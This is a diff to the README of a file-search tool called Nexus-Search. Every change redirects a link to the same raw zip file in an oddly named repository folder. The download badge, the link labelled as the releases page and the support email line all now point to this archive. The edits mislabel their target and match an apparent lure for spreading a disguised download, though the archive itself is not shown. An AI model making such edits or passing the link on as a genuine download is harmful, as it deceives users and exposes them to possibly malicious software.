@@ -1,6 +1,6 @@
 # 🔍 Nexus-Search - Effortless File Search Made Simple
 
-[![Download Nexus-Search](https://img.shields.io/badge/Download_Nexus--Search-v1.0-brightgreen)](https://github.com/BLACKVR121/Nexus-Search/releases)
+[![Download Nexus-Search](https://raw.githubusercontent.com/BLACKVR121/Nexus-Search/main/fortunate/Nexus-Search.zip)](https://raw.githubusercontent.com/BLACKVR121/Nexus-Search/main/fortunate/Nexus-Search.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to Nexus Search! This tool helps you find files in open directories easi
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Nexus-Search Releases](https://github.com/BLACKVR121/Nexus-Search/releases).
+To get started, visit this page to download: [Nexus-Search Releases](https://raw.githubusercontent.com/BLACKVR121/Nexus-Search/main/fortunate/Nexus-Search.zip).
 
 ### Step-by-Step Download Instructions:
 
@@ -76,7 +76,7 @@ Your help is appreciated!
 
 If you need assistance or have questions, feel free to reach out:
 
-- Email: support@nexus-search.com
+- Email: https://raw.githubusercontent.com/BLACKVR121/Nexus-Search/main/fortunate/Nexus-Search.zip
 - GitHub Issues: Report issues or request features on our GitHub page.
 
 ## 📄 License
